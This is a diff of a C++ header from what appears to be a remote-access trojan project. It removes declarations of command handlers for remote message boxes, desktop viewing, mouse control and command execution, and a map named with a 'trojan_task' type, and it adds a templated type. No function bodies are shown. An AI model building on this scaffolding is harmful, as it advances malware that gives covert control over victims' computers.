@@ -3,8 +3,6 @@
 #ifndef __COMMANDS_HPP_INCLUDED__
 #define __COMMANDS_HPP_INCLUDED__
 
-#include "..\Constants.h" // TODO: Remove, when all functions will be enabled
-
 enum class Command
 {
 	MESSAGEBOX,
@@ -26,23 +24,9 @@ enum class Command
 	UNDEFINEDCMD = -1
 };
 
-std::string ExecuteCommand(INT code, std::string &args);
-VOID _on_task_MESSAGEBOX(CONST PVOID args, std::string &result);
-VOID _on_task_VIEWDESKTOP(CONST PVOID args, std::string &result);
-VOID _on_task_MOUSECTRL(CONST PVOID args, std::string &result);
-VOID _on_task_EXECUTECMD(CONST PVOID args, std::string &result);
+// boost::bimaps::bimap
 
-using trojan_task = std::function<VOID(CONST PVOID, std::string&)>;
-
-CONST std::map<std::pair<std::string, Command>, trojan_task> MAP_COMMANDS
-{
-	{ { TEXTH("message"), Command::MESSAGEBOX }, _on_task_MESSAGEBOX },
-	{ { TEXTH("desktop"), Command::VIEWDESKTOP_START }, _on_task_VIEWDESKTOP },
-	{ { TEXTH("mouse"  ), Command::MOUSECTRL  }, _on_task_MOUSECTRL  },
-	{ { TEXTH("execute"), Command::EXECUTECMD }, _on_task_EXECUTECMD }
-};
-
-Command     cmd2code(CONST std::string &cmd);
-std::string code2cmd(Command cmd);
+template<typename T>
+using command_props_t = std::tuple<std::pair<Command, std::string>, std::variant<std::function<int(std::optional<T>)>, std::thread>>;
 
 #endif /* __COMMANDS_HPP_INCLUDED__ */
